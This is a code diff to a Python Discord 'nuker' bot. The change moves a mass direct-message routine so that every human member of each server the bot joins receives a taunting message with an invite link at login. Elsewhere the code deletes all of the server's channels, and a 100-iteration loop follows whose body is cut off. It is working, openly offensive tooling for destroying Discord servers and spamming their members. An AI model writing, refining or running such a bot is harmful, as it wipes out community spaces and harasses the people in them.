@@ -37,6 +37,13 @@ def nuker():
     async def on_ready():
         print(f'Logged in as {bot.user}')
         for guild in bot.guilds:
+            for member in guild.members:
+                if not member.bot:
+                    try:
+                        await member.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
+                        print(f'Sent DM to: {member.name}')
+                    except Exception as e:
+                        print(f'Could not send DM to: {member.name}, {e}')
             await manage_guild(guild)
 
     async def manage_guild(guild):
@@ -46,13 +53,7 @@ def nuker():
                 print(f'Deleted channel: {channel.name}')
             except Exception as e:
                 print(f'Could not delete channel: {channel.name}, {e}')
-            for member in guild.members:
-                if not member.bot:
-                    try:
-                        await member.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
-                        print(f'Sent DM to: {member.name}')
-                    except Exception as e:
-                        print(f'Could not send DM to: {member.name}, {e}')
+            
 
         for _ in range(100):
             try:
